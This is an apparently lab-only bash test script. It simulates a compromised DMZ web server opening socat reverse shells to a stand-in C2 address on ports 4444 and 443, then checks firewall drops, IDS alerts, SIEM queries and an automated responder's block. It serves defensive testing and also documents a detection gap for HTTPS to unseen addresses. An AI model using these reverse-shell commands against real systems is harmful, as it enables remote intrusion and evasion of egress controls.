#!/usr/bin/env bash
set -uo pipefail
cd "$(dirname "$0")"
. ./lib.sh

C2="192.0.2.99"
FRESH="192.0.2.10"
RUN="a4-$(date +%H%M%S)"

webrun() { docker run --rm --network "container:${P}-web" client:0.1 "$@"; }

c2_listen() {
  docker exec "${P}-attacker" rm -f "/tmp/c2-$1-$2.log"
  docker exec -d "${P}-attacker" sh -c "(printf 'id\nip -4 -br addr show dev eth1\nexit\n'; sleep 8) | socat -T10 - TCP-LISTEN:$2,bind=$1,reuseaddr > /tmp/c2-$1-$2.log 2>&1"
}

c2_got() { docker exec "${P}-attacker" cat "/tmp/c2-$1-$2.log" 2>/dev/null; }

shell() { webrun socat -T5 "TCP:$1:$2,connect-timeout=3" EXEC:sh >/dev/null 2>&1; }

cleanup() {
  docker exec "${P}-attacker" sh -c "pkill -f 'TCP-LISTEN:(4444|443),bind='" >/dev/null 2>&1
  docker exec "${P}-attacker" ip addr del "${C2}/24" dev eth1 >/dev/null 2>&1
}
trap cleanup EXIT

head1 "A-4  Compromised web server calls home  (web 10.10.10.10 -> C2 ${C2})"
echo "   Scenario: the attacker already runs code on the web server and wants an"
echo "   interactive shell. The web server opens the connection itself (reverse shell),"
echo "   because nothing from the Internet may connect to it directly."
if response_prepare enforce; then RESP=yes; else RESP=no; fi

stage "Stage 1  Attacker infrastructure: C2 server ${C2} listens on TCP 4444 and 443"
docker exec "${P}-attacker" ip addr add "${C2}/24" dev eth1 >/dev/null 2>&1
c2_listen "${C2}" 4444
c2_listen "${C2}" 443
sleep 0.5
echo "   listeners ready"

stage "Stage 2  Classic reverse shell to ${C2}:4444"
shell "${C2}" 4444
check "fw-dmz drops the connection (V-12, only 80 and 443 leave the DMZ)" "no shell" "no shell" "$(c2_got "${C2}" 4444 | grep -q 'uid=' && echo shell || echo 'no shell')"
check "IDS detects the attempt on the mirror port (SID 1000003)" yes "yes" "$(siem_query '{job="dmz", host="ids", ident="suricata"} | json | alert_signature_id="1000003" | dest_ip="'"${C2}"'"')"
if [ "${RESP}" = yes ]; then
  check "responder blocks all connections from inside to ${C2} (P-5)" yes "yes" "$(wait_listed egress "${C2}")"
  respond list 2>/dev/null | grep -E "^egress ${C2//./\\.} " | sed 's/^/   fw-edge: /'
  ms=$(reaction_ms egress "${C2}")
  echo "   reaction time from the IDS alert in the SIEM to the block on fw-edge: ${ms:-?} ms"
fi

stage "Stage 3  Fallback: reverse shell over TCP 443, which the DMZ may use (K-06)"
shell "${C2}" 443
if [ "${RESP}" = yes ]; then
  check "shell over 443 to the known C2 server dropped at fw-edge" "no shell" "$(c2_got "${C2}" 443 | grep -q 'uid=' && echo shell || echo 'no shell')"
else
  echo "   without the responder the shell over 443 would reach ${C2}"
fi

if [ "${RESP}" = yes ]; then
  stage "Stage 4  Containment covers the whole company, without locking anyone out"
  if client socat -T1 /dev/null "TCP:${C2}:443,connect-timeout=2" >/dev/null 2>&1; then r=reachable; else r=blocked; fi
  check "client1 -> ${C2} TCP 443 blocked as well" blocked "blocked" "${r}"
  if inet socat -T1 /dev/null "TCP:203.0.113.2:443,connect-timeout=2,bind=${C2}" >/dev/null 2>&1; then r=reachable; else r=blocked; fi
  check "${C2} itself still reaches the portal (a compromised server cannot lock out others)" reachable "reachable" "${r}"
fi

stage "Stage 5  Limit: reverse shell over 443 to an address never seen before (${FRESH})"
c2_listen "${FRESH}" 443
sleep 0.5
shell "${FRESH}" 443
if c2_got "${FRESH}" 443 | grep -q 'uid='; then
  echo "   The shell reached ${FRESH}. Output on the attacker's side:"
  c2_got "${FRESH}" 443 | grep -E 'uid=|eth1' | sed 's/^/     /'
  echo "   HTTPS to an unknown address raises no alarm: the signature only covers ports"
  echo "   other than 80 and 443, and the IDS cannot read inside TLS. The responder can only"
  echo "   contain a C2 address that has given itself away once (stage 2)."
  echo "   Improvement: allow the DMZ only fixed destinations (package mirrors) instead of"
  echo "   all of TCP 80 and 443 (Kommunikationsmatrix, Festlegung 3)."
else
  echo "   No shell: outbound HTTPS from the DMZ is restricted further than K-06 describes."
fi

stage "Outcome"
echo "   The naive reverse shell failed at fw-dmz, the IDS saw it, and the responder cut the"
echo "   C2 server off for the whole company within a second, including the HTTPS fallback."
echo "   A new, unknown C2 address over HTTPS remains a gap of signature-based detection."
echo "   Next steps for the SOC: make evidence IP=${C2}, then rebuild web (make recover)."

stage "In the SIEM, filter this run:"
echo "   ids alerts     : {job=\"dmz\", host=\"ids\"} | json | dest_ip=\"${C2}\""
echo "   fw-dmz drops   : {job=\"dmz\", host=\"fw-dmz\", ident=\"ulogd\"} | json | dst=\"${C2}\""

finish
